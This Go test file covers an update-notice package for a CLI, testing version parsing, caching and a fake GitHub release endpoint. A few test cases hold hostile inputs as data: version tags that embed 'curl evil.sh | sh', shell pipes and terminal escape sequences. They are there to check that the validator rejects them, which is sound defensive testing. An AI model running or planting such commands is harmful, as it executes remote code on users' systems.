package update

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

func TestNormalize(t *testing.T) {
	tests := []struct{ in, want string }{
		{"1.2.3", "v1.2.3"},
		{"v1.2.3", "v1.2.3"},
		{"  v1.2.3 ", "v1.2.3"},
		{"", ""},
	}
	for _, tt := range tests {
		if got := normalize(tt.in); got != tt.want {
			t.Errorf("normalize(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestCompareSemver(t *testing.T) {
	tests := []struct {
		a, b string
		want int
	}{
		{"v1.2.3", "1.2.3", 0},
		{"v1.2.4", "1.2.3", 1},
		{"1.2.3", "v1.2.4", -1},
		{"v2.0.0", "v1.9.9", 1},
		{"v1.10.0", "v1.9.0", 1},
		{"v1.2.3-rc1", "v1.2.3", 0},
		{"v1.2.3+build", "1.2.3", 0},
		{"v1.0", "v1.0.0", 0},
		{"v1.2.3.4", "v1.2.3", 0},
		{"garbage", "v0.0.0", 0},
	}
	for _, tt := range tests {
		if got := compareSemver(tt.a, tt.b); got != tt.want {
			t.Errorf("compareSemver(%q,%q) = %d, want %d", tt.a, tt.b, got, tt.want)
		}
	}
}

func TestEnvSuppressed(t *testing.T) {
	clearEnv := func() {
		for _, e := range []string{"ZENSU_NO_UPDATE_CHECK", "CI", "NO_UPDATE_NOTIFIER"} {
			t.Setenv(e, "")
		}
	}
	tests := []struct {
		name    string
		current string
		env     map[string]string
		args    []string
		want    bool
	}{
		{"normal release interactive", "1.2.3", nil, []string{"auth", "status"}, false},
		{"dev build", "dev", nil, nil, true},
		{"empty version", "", nil, nil, true},
		{"opt out", "1.2.3", map[string]string{"ZENSU_NO_UPDATE_CHECK": "1"}, nil, true},
		{"ci", "1.2.3", map[string]string{"CI": "true"}, nil, true},
		{"no update notifier", "1.2.3", map[string]string{"NO_UPDATE_NOTIFIER": "1"}, nil, true},
		{"completion command", "1.2.3", nil, []string{"completion", "zsh"}, true},
		{"hidden complete", "1.2.3", nil, []string{"__complete", "auth"}, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			clearEnv()
			for k, v := range tt.env {
				t.Setenv(k, v)
			}
			if got := envSuppressed(tt.current, tt.args); got != tt.want {
				t.Errorf("envSuppressed(%q, %v) = %v, want %v", tt.current, tt.args, got, tt.want)
			}
		})
	}
}

func TestIsTerminalRegularFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "f")
	if err := os.WriteFile(path, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	fh, err := os.Open(path)
	if err != nil {
		t.Fatal(err)
	}
	defer fh.Close()
	if isTerminal(fh) {
		t.Error("regular file reported as terminal")
	}
}

func fakeGitHub(t *testing.T, tag string, status int) *uint32 {
	t.Helper()
	var hits uint32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddUint32(&hits, 1)
		if ua := r.Header.Get("User-Agent"); !strings.HasPrefix(ua, "zensu-cli/") {
			t.Errorf("User-Agent = %q, want a zensu-cli/ prefix (GitHub rejects empty UA)", ua)
		}
		if status != 0 && status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		_ = json.NewEncoder(w).Encode(map[string]string{"tag_name": tag})
	}))
	t.Cleanup(srv.Close)
	old := githubAPIBase
	githubAPIBase = srv.URL
	t.Cleanup(func() { githubAPIBase = old })
	return &hits
}

func TestNoticeFetchesWhenNoCache(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v1.3.0", http.StatusOK)

	got := Notice(context.Background(), "1.2.3", time.Now())
	if !strings.Contains(got, "v1.3.0") || !strings.Contains(got, "you have 1.2.3") {
		t.Errorf("notice = %q, want mention of v1.3.0 and 1.2.3", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("expected 1 fetch, got %d", n)
	}
	c, err := loadCache()
	if err != nil {
		t.Fatalf("loadCache: %v", err)
	}
	if c.LatestVersion != "v1.3.0" {
		t.Errorf("cached latest = %q, want v1.3.0", c.LatestVersion)
	}
}

func TestNoticeUsesFreshCacheNoNetwork(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v9.9.9", http.StatusOK)
	now := time.Now()
	if err := saveCache(cache{CheckedAt: now.Add(-time.Hour), LatestVersion: "v1.5.0"}); err != nil {
		t.Fatal(err)
	}

	got := Notice(context.Background(), "1.2.3", now)
	if !strings.Contains(got, "v1.5.0") {
		t.Errorf("notice = %q, want cached v1.5.0", got)
	}
	if n := atomic.LoadUint32(hits); n != 0 {
		t.Errorf("fresh cache should not hit network, got %d hits", n)
	}
}

func TestNoticeRefetchesStaleCache(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v2.0.0", http.StatusOK)
	now := time.Now()
	if err := saveCache(cache{CheckedAt: now.Add(-48 * time.Hour), LatestVersion: "v1.0.0"}); err != nil {
		t.Fatal(err)
	}

	got := Notice(context.Background(), "1.2.3", now)
	if !strings.Contains(got, "v2.0.0") {
		t.Errorf("notice = %q, want refetched v2.0.0", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("stale cache should refetch once, got %d hits", n)
	}
	c, err := loadCache()
	if err != nil {
		t.Fatalf("loadCache: %v", err)
	}
	if c.LatestVersion != "v2.0.0" {
		t.Errorf("stale cache not refreshed: latest = %q, want v2.0.0", c.LatestVersion)
	}
	if d := now.Sub(c.CheckedAt); d < 0 || d > time.Second {
		t.Errorf("stale cache checkedAt = %v, want ~%v", c.CheckedAt, now)
	}
}

func TestNoticeUpToDate(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v1.2.3", http.StatusOK)
	if got := Notice(context.Background(), "1.2.3", time.Now()); got != "" {
		t.Errorf("notice = %q, want empty when current == latest", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("expected the version comparison (1 fetch), got %d hits — empty result may be a swallowed fetch error", n)
	}
}

func TestNoticeCurrentAheadOfLatest(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v1.2.3", http.StatusOK)
	if got := Notice(context.Background(), "1.3.0", time.Now()); got != "" {
		t.Errorf("notice = %q, want empty when current newer than latest", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("expected the version comparison (1 fetch), got %d hits — empty result may be a swallowed fetch error", n)
	}
}

func TestNoticeMalformedCacheFallsBackToFetch(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("ZENSU_CONFIG_DIR", dir)
	if err := os.WriteFile(filepath.Join(dir, cacheFileName), []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	hits := fakeGitHub(t, "v1.4.0", http.StatusOK)

	got := Notice(context.Background(), "1.2.3", time.Now())
	if !strings.Contains(got, "v1.4.0") {
		t.Errorf("notice = %q, want fetch fallback v1.4.0", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("malformed cache should fall back to fetch, got %d hits", n)
	}
}

func TestNoticeFetchErrorIsSilent(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	fakeGitHub(t, "", http.StatusInternalServerError)
	if got := Notice(context.Background(), "1.2.3", time.Now()); got != "" {
		t.Errorf("notice = %q, want empty on fetch error", got)
	}
}

func TestFinishWritesNotice(t *testing.T) {
	var buf bytes.Buffer
	ch := make(chan string, 1)
	ch <- "update available: ..."
	Finish(ch, &buf)
	if buf.String() != "update available: ...\n" {
		t.Errorf("Finish wrote %q, want the notice with newline", buf.String())
	}
}

func TestFinishSilentOnEmptyAndTimeout(t *testing.T) {
	var buf bytes.Buffer
	empty := make(chan string, 1)
	empty <- ""
	Finish(empty, &buf)
	if buf.String() != "" {
		t.Errorf("Finish wrote %q for empty notice, want nothing", buf.String())
	}

	buf.Reset()
	oldGrace := graceWait
	graceWait = 5 * time.Millisecond
	t.Cleanup(func() { graceWait = oldGrace })
	Finish(make(chan string), &buf)
	if buf.String() != "" {
		t.Errorf("Finish wrote %q on timeout, want nothing", buf.String())
	}
}

func TestStartSuppressedYieldsEmpty(t *testing.T) {
	ch, cancel := Start("dev")
	defer cancel()
	select {
	case got := <-ch:
		if got != "" {
			t.Errorf("Start(dev) yielded %q, want empty", got)
		}
	case <-time.After(time.Second):
		t.Fatal("Start did not yield")
	}
}

func TestStartRunsCheckWhenInteractive(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	for _, e := range []string{"ZENSU_NO_UPDATE_CHECK", "CI", "NO_UPDATE_NOTIFIER"} {
		t.Setenv(e, "")
	}
	oldTTY := isTerminalStderr
	isTerminalStderr = func() bool { return true }
	t.Cleanup(func() { isTerminalStderr = oldTTY })
	oldArgs := osArgs
	osArgs = func() []string { return []string{"auth", "status"} }
	t.Cleanup(func() { osArgs = oldArgs })
	fakeGitHub(t, "v3.0.0", http.StatusOK)

	ch, cancel := Start("1.2.3")
	defer cancel()
	select {
	case got := <-ch:
		if !strings.Contains(got, "v3.0.0") {
			t.Errorf("Start yielded %q, want notice for v3.0.0", got)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("Start did not yield in time")
	}
	if c, err := loadCache(); err != nil || c.LatestVersion != "v3.0.0" {
		t.Errorf("Start goroutine should have persisted v3.0.0 before teardown; got %q err=%v", c.LatestVersion, err)
	}
}

func TestSaveCacheErrorsWhenDirUnusable(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "regular")
	if err := os.WriteFile(file, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("ZENSU_CONFIG_DIR", filepath.Join(file, "sub"))
	if err := saveCache(cache{CheckedAt: time.Now(), LatestVersion: "v1.0.0"}); err == nil {
		t.Error("saveCache should error when the config dir cannot be created")
	}
}

func TestFetchLatestNetworkError(t *testing.T) {
	old := githubAPIBase
	githubAPIBase = "http://127.0.0.1:0"
	t.Cleanup(func() { githubAPIBase = old })
	if _, err := fetchLatest(context.Background(), "1.2.3"); err == nil {
		t.Error("fetchLatest should error on an unreachable host")
	}
}

func TestValidVersion(t *testing.T) {
	tests := []struct {
		in   string
		want bool
	}{
		{"v1.2.3", true},
		{"1.2.3", true},
		{"v1.2.3-rc1", true},
		{"v1.2.3+build.5", true},
		{"v1.2", true},
		{"v1", true},
		{"  v1.2.3  ", true},
		{"", false},
		{"latest", false},
		{"v1.2.3 | sh", false},
		{"v1.3.0\r evil", false},
		{"v1.2.3\x1b[31m", false},
		{"v1.2.3\nv9.9.9", false},
		{"v9999999999999999999.0.0", false},
	}
	for _, tt := range tests {
		if got := validVersion(tt.in); got != tt.want {
			t.Errorf("validVersion(%q) = %v, want %v", tt.in, got, tt.want)
		}
	}
}

func TestNoticeRejectsMaliciousTag(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	fakeGitHub(t, "v1.3.0\r\x1b[2Kcurl evil.sh | sh", http.StatusOK)
	if got := Notice(context.Background(), "1.2.3", time.Now()); got != "" {
		t.Errorf("notice = %q, want empty for a tag with control characters", got)
	}
}

func TestNoticeRejectsMaliciousFreshCache(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v9.9.9", http.StatusOK)
	now := time.Now()
	if err := saveCache(cache{CheckedAt: now.Add(-time.Hour), LatestVersion: "v1.3.0\r evil"}); err != nil {
		t.Fatal(err)
	}
	if got := Notice(context.Background(), "1.2.3", now); got != "" {
		t.Errorf("notice = %q, want empty for a malicious cached tag", got)
	}
	if n := atomic.LoadUint32(hits); n != 0 {
		t.Errorf("fresh cache should not refetch, got %d hits", n)
	}
}

func TestNoticeRefetchesAtFreshnessBoundary(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	hits := fakeGitHub(t, "v2.0.0", http.StatusOK)
	now := time.Now()
	if err := saveCache(cache{CheckedAt: now.Add(-checkInterval), LatestVersion: "v1.0.0"}); err != nil {
		t.Fatal(err)
	}
	got := Notice(context.Background(), "1.2.3", now)
	if !strings.Contains(got, "v2.0.0") {
		t.Errorf("notice = %q, want refetched v2.0.0 at the exact freshness boundary", got)
	}
	if n := atomic.LoadUint32(hits); n != 1 {
		t.Errorf("cache aged exactly checkInterval must refetch (predicate is strict <), got %d hits", n)
	}
}

func TestSaveCacheRenameFails(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("ZENSU_CONFIG_DIR", dir)
	if err := os.Mkdir(filepath.Join(dir, cacheFileName), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := saveCache(cache{CheckedAt: time.Now(), LatestVersion: "v1.0.0"}); err == nil {
		t.Error("saveCache should error when the rename target is a directory")
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") {
			t.Errorf("orphaned temp file left behind after failed rename: %s", e.Name())
		}
	}
}

func TestSaveCacheConcurrent(t *testing.T) {
	t.Setenv("ZENSU_CONFIG_DIR", t.TempDir())
	const n = 8
	var wg sync.WaitGroup
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			if err := saveCache(cache{CheckedAt: time.Now(), LatestVersion: fmt.Sprintf("v1.0.%d", i)}); err != nil {
				t.Errorf("concurrent saveCache: %v", err)
			}
		}(i)
	}
	wg.Wait()
	c, err := loadCache()
	if err != nil {
		t.Fatalf("loadCache after concurrent writes: %v", err)
	}
	if !strings.HasPrefix(c.LatestVersion, "v1.0.") {
		t.Errorf("cache torn/empty after concurrent writes: %q", c.LatestVersion)
	}
}
